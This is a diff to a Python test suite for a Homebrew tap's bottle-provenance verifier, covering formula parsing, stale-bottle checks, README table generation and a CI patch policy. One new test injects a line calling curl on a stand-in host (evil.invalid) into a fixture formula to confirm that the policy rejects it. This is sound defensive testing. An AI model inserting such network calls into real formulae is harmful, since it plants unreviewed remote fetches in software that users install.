@@ -131,6 +131,7 @@ def reference_parse_formula(rb_path: Path, tag: str = "arm64_tahoe") -> dict:
         "pkg_version": pkg_version,
         "release_tag": f"{formula}-{pkg_version}",
         "root_url": root_url,
+        "rebuild": rebuild,
         "brew_filename": brew_fn,
         "release_filename": rel_fn,
         "expected_sha256": bottle_sha,
@@ -666,13 +667,7 @@ class Suite:
     # ── Test Cases ───────────────────────────────────────────────────────────
 
     def test_parse_all_17_live_formulae(self, shell: Path, label: str) -> None:
-        _, home, _, _, _, _, env = self.environment(shell, label)
-        env["PROVENANCE_REPO_ROOT"] = str(self.repo)
-        before = self.tree(home, ignore_macos_library=True)
-        proc = self.run_verifier(shell, env, ["--parse-only", "--json"])
-        assert proc.returncode == 0, f"exit {proc.returncode}: {proc.stderr}"
-        assert proc.stderr == "", f"unexpected stderr in --json mode: {proc.stderr}"
-        doc = json.loads(proc.stdout)
+        root, home, _, _, _, _, env = self.environment(shell, label)
         live_files = [
             p
             for p in sorted((self.repo / "Formula").glob("*.rb"))
@@ -680,6 +675,38 @@ class Suite:
         ]
         expected_count = len(live_files)
         assert expected_count >= 17
+
+        # On pre-bottling bump branches, Formula/*.rb carries the new upstream URL/revision
+        # while retaining the previous bottle root_url until publish.yml runs brew bottle --merge.
+        # Normalize only root_url to the expected release tag in an isolated copy so metadata
+        # parsing is verified across every live formula without blocking version-bump CI;
+        # stale bottle rejection itself is covered by test_stale_bottle_on_version_bump.
+        norm_repo = root / "live-normalized"
+        norm_formula_dir = norm_repo / "Formula"
+        norm_formula_dir.mkdir(parents=True)
+        expected_by_name = {}
+        for rb in live_files:
+            ref = reference_parse_formula(rb)
+            expected_root = (
+                f"https://github.com/artagon/homebrew-aitools/releases/download/{ref['release_tag']}"
+            )
+            rb_text = re.sub(
+                r'(^\s*root_url )"[^"]+"',
+                rf'\1"{expected_root}"',
+                rb.read_text(encoding="utf-8"),
+                count=1,
+                flags=re.M,
+            )
+            dst = norm_formula_dir / rb.name
+            dst.write_text(rb_text, encoding="utf-8")
+            expected_by_name[ref["formula"]] = reference_parse_formula(dst)
+
+        env["PROVENANCE_REPO_ROOT"] = str(norm_repo)
+        before = self.tree(home, ignore_macos_library=True)
+        proc = self.run_verifier(shell, env, ["--parse-only", "--json"])
+        assert proc.returncode == 0, f"exit {proc.returncode}: {proc.stdout}\n{proc.stderr}"
+        assert proc.stderr == "", f"unexpected stderr in --json mode: {proc.stderr}"
+        doc = json.loads(proc.stdout)
         assert doc["ok"] is True
         assert (
             doc["checked"] == expected_count
@@ -688,20 +715,20 @@ class Suite:
         )
 
         by_name = {r["formula"]: r for r in doc["results"]}
-        for rb in live_files:
-            expected = reference_parse_formula(rb)
-            got = by_name[expected["formula"]]
+        for formula_name, expected in expected_by_name.items():
+            got = by_name[formula_name]
             for key in (
                 "version",
                 "pkg_version",
                 "release_tag",
                 "root_url",
+                "rebuild",
                 "brew_filename",
                 "release_filename",
                 "expected_sha256",
             ):
                 assert got[key] == expected[key], (
-                    f"{rb.name} {key}: got {got[key]!r}, expected {expected[key]!r}"
+                    f"{formula_name}.rb {key}: got {got[key]!r}, expected {expected[key]!r}"
                 )
         self.assert_home_clean(home, before)
 
@@ -861,10 +888,11 @@ end
         repo_dir, _, state = self.build_fixture_repo(root, ["ripwire"])
         state_file.write_text(json.dumps(state), encoding="utf-8")
         rb = repo_dir / "Formula/ripwire.rb"
-        rb.write_text(
-            rb.read_text(encoding="utf-8").replace("v0.6.9.tar.gz", "v0.7.0.tar.gz"),
-            encoding="utf-8",
-        )
+        cur_version = reference_parse_formula(rb)["version"]
+        orig_text = rb.read_text(encoding="utf-8")
+        mutated_text = orig_text.replace(f"v{cur_version}.tar.gz", "v99.99.99.tar.gz", 1)
+        assert mutated_text != orig_text, f"Failed to mutate version {cur_version} in {rb}"
+        rb.write_text(mutated_text, encoding="utf-8")
         env["PROVENANCE_REPO_ROOT"] = str(repo_dir)
 
         proc = self.run_verifier(shell, env, ["--allow-file-root-url", "--json", "ripwire"])
@@ -877,6 +905,8 @@ end
     def test_save_bundles_and_offline_roundtrip(self, shell: Path, label: str) -> None:
         root, home, bindir, _, state_file, call_log, env = self.environment(shell, label)
         repo_dir, _, state = self.build_fixture_repo(root, ["ripwire"])
+        # --save-bundles must pass --bundle to gh attestation verify so exported sidecars are verified.
+        state["expect_bundle"] = True
         state_file.write_text(json.dumps(state), encoding="utf-8")
         env["PROVENANCE_REPO_ROOT"] = str(repo_dir)
 
@@ -1104,6 +1134,215 @@ end
             assert "unbound variable" not in proc_bad.stderr
         assert set(tmpdir.iterdir()) == before_tmp, "leaked scratch directories in TMPDIR"
 
+    def test_readme_table_and_ci_patch_policy(self, shell: Path, label: str) -> None:
+        root, _, _, _, _, _, _ = self.environment(shell, label)
+        # 1. Test update-readme-bottles.sh write, --check pass, and drift detection.
+        readme_script = self.repo / "scripts/update-readme-bottles.sh"
+        fixture_repo = root / "readme-repo"
+        (fixture_repo / "Formula").mkdir(parents=True)
+        sha = "b" * 64
+        (fixture_repo / "Formula/demo.rb").write_text(
+            f'''class Demo < Formula
+  desc "Demo tool"
+  homepage "https://example.com"
+  url "https://github.com/example/demo/archive/refs/tags/v1.0.0.tar.gz"
+  sha256 "{sha}"
+
+  bottle do
+    root_url "https://github.com/artagon/homebrew-aitools/releases/download/demo-1.0.0"
+    sha256 cellar: :any_skip_relocation, arm64_tahoe: "{sha}"
+  end
+
+  def install
+    bin.install "demo"
+  end
+end
+''',
+            encoding="utf-8",
+        )
+        readme_file = fixture_repo / "README.md"
+        readme_file.write_text(
+            "# Demo\n\n<!-- BEGIN BOTTLE_PROVENANCE_TABLE -->\nstale\n<!-- END BOTTLE_PROVENANCE_TABLE -->\n",
+            encoding="utf-8",
+        )
+        run_env = os.environ.copy()
+        run_env["PROVENANCE_REPO_ROOT"] = str(fixture_repo)
+        run_env["README_BOTTLES_FILE"] = str(readme_file)
+
+        chk_stale = subprocess.run(
+            [str(shell), str(readme_script), "--check"],
+            env=run_env,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        assert chk_stale.returncode == 1
+
+        upd = subprocess.run(
+            [str(shell), str(readme_script)],
+            env=run_env,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        assert upd.returncode == 0, upd.stderr
+        rendered = readme_file.read_text(encoding="utf-8")
+        assert "demo-1.0.0.arm64_tahoe.bottle.tar.gz.intoto.jsonl" in rendered
+        assert f"attestations/sha256:{sha}" in rendered
+
+        chk_ok = subprocess.run(
+            [str(shell), str(readme_script), "--check"],
+            env=run_env,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        assert chk_ok.returncode == 0, chk_ok.stderr
+
+        # 2. Test sourced library caller-state preservation (artagon-shell/shell-bash/v1)
+        #    and scripts/ci/ input sanitization + publish-bottles.sh block-aware patch policy.
+        common_lib = self.repo / "scripts/ci/common.sh"
+        assert not os.access(common_lib, os.X_OK), "sourced library scripts/ci/common.sh must be non-executable"
+        state_probe = subprocess.run(
+            [
+                str(shell),
+                "-c",
+                f'set +e +u; before="$(set +o)|pwd=$(pwd)|ifs=${{IFS}}"; '
+                f'source "{common_lib}"; '
+                f'after="$(set +o)|pwd=$(pwd)|ifs=${{IFS}}"; '
+                f'[[ "${{before}}" = "${{after}}" ]] && ci::require_uint "42" "num"',
+            ],
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        assert state_probe.returncode == 0, f"common.sh mutated caller state: {state_probe.stderr}"
+
+        pub_script = self.repo / "scripts/ci/publish-bottles.sh"
+        bad_env = os.environ.copy()
+        bad_env["GITHUB_REF"] = "refs/heads/feature"
+        bad_env["GITHUB_REPOSITORY"] = "artagon/homebrew-aitools"
+        bad_ref = subprocess.run(
+            [str(shell), str(pub_script), "validate"],
+            env=bad_env,
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        assert bad_ref.returncode == 1 and "refs/heads/main" in bad_ref.stderr
+
+        git_repo = root / "patch-policy-git"
+        git_repo.mkdir()
+        git_env = os.environ.copy()
+        git_env.update(
+            {
+                "GIT_AUTHOR_NAME": "Test",
+                "GIT_AUTHOR_EMAIL": "test@example.com",
+                "GIT_COMMITTER_NAME": "Test",
+                "GIT_COMMITTER_EMAIL": "test@example.com",
+            }
+        )
+        subprocess.run(["git", "init", "-b", "main"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        (git_repo / "Formula").mkdir()
+        base_formula = f'''class Demo < Formula
+  desc "Demo tool"
+  homepage "https://example.com"
+  url "https://github.com/example/demo/archive/refs/tags/v1.0.0.tar.gz"
+  sha256 "{sha}"
+
+  depends_on "rust" => :build
+
+  def install
+    bin.install "demo"
+  end
+end
+'''
+        (git_repo / "Formula/demo.rb").write_text(base_formula, encoding="utf-8")
+        (git_repo / "README.md").write_text(
+            "# Demo\n\n<!-- BEGIN BOTTLE_PROVENANCE_TABLE -->\n<!-- END BOTTLE_PROVENANCE_TABLE -->\n",
+            encoding="utf-8",
+        )
+        subprocess.run(["git", "add", "."], cwd=git_repo, env=git_env, check=True)
+        subprocess.run(["git", "commit", "-m", "base"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        base_sha = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=git_repo, text=True).strip()
+
+        # Simulate PR commit (url bump to v1.1.0) + bottle merge commit + README table commit.
+        subprocess.run(["git", "checkout", "-b", "pr"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        pr_formula = base_formula.replace("v1.0.0.tar.gz", "v1.1.0.tar.gz")
+        (git_repo / "Formula/demo.rb").write_text(pr_formula, encoding="utf-8")
+        subprocess.run(["git", "commit", "-am", "demo 1.1.0"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        head_sha = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=git_repo, text=True).strip()
+
+        bottled_formula = pr_formula.replace(
+            '  depends_on "rust" => :build',
+            f'''  bottle do
+    root_url "https://github.com/artagon/homebrew-aitools/releases/download/demo-1.1.0"
+    sha256 cellar: :any_skip_relocation, arm64_tahoe: "{sha}"
+  end
+
+  depends_on "rust" => :build''',
+        )
+        (git_repo / "Formula/demo.rb").write_text(bottled_formula, encoding="utf-8")
+        subprocess.run(
+            [str(shell), str(readme_script)],
+            env={
+                **os.environ,
+                "PROVENANCE_REPO_ROOT": str(git_repo),
+                "README_BOTTLES_FILE": str(git_repo / "README.md"),
+            },
+            check=True,
+        )
+        subprocess.run(["git", "commit", "-am", "demo: update 1.1.0 bottle"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        mbox = subprocess.check_output(["git", "format-patch", "--stdout", f"{base_sha}..HEAD"], cwd=git_repo)
+        subprocess.run(["git", "checkout", "main"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+
+        rtemp = root / "rtemp"
+        (rtemp / "publish-stage").mkdir(parents=True)
+        (rtemp / "publish-stage/commits.mbox").write_bytes(mbox)
+        map_path = rtemp / "publish-stage/release-map.json"
+        map_path.write_text(
+            json.dumps({"schema": "artagon-bottle-release-map/v1", "bottles": [{"formula": "demo"}]}),
+            encoding="utf-8",
+        )
+        policy_env = {
+            **git_env,
+            "GITHUB_REF": "refs/heads/main",
+            "RUNNER_TEMP": str(rtemp),
+            "BASE_MAIN_SHA": base_sha,
+            "HEAD_SHA": head_sha,
+            "RELEASE_MAP_SHA256": digest(map_path),
+            "SKIP_FETCH_HEAD_SHA": "1",
+        }
+        ok_policy = subprocess.run(
+            [str(shell), str(pub_script), "verify-patch-policy"],
+            cwd=git_repo,
+            env=policy_env,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        assert ok_policy.returncode == 0, f"{ok_policy.stdout}\n{ok_policy.stderr}"
+
+        # Reset main and inject an unauthorized line outside `bottle do ... end` -> must fail closed!
+        subprocess.run(["git", "reset", "--hard", base_sha], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        subprocess.run(["git", "checkout", "pr"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        sneaky = bottled_formula.replace('bin.install "demo"', 'system "curl", "https://evil.invalid"')
+        (git_repo / "Formula/demo.rb").write_text(sneaky, encoding="utf-8")
+        subprocess.run(["git", "commit", "-am", "sneaky"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+        bad_mbox = subprocess.check_output(["git", "format-patch", "--stdout", f"{base_sha}..HEAD"], cwd=git_repo)
+        (rtemp / "publish-stage/commits.mbox").write_bytes(bad_mbox)
+        subprocess.run(["git", "checkout", "main"], cwd=git_repo, env=git_env, check=True, capture_output=True)
+
+        bad_policy = subprocess.run(
+            [str(shell), str(pub_script), "verify-patch-policy"],
+            cwd=git_repo,
+            env=policy_env,
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        assert bad_policy.returncode == 1 and "outside bottle do" in bad_policy.stderr
+
     def run(self) -> list[dict]:
         cases = (
             ("parse-all-17-live", self.test_parse_all_17_live_formulae),
@@ -1117,6 +1356,7 @@ end
             ("tampered-detached-sbom", self.test_tampered_detached_sbom_rejected),
             ("cosign-absent-vs-required", self.test_cosign_absent_vs_require_cosign),
             ("homebrew-isolation-and-cli", self.test_homebrew_isolation_and_cli_hygiene),
+            ("readme-table-and-ci-patch-policy", self.test_readme_table_and_ci_patch_policy),
         )
         for shell_name, shell_path in self.shells.items():
             for suffix, fn in cases:
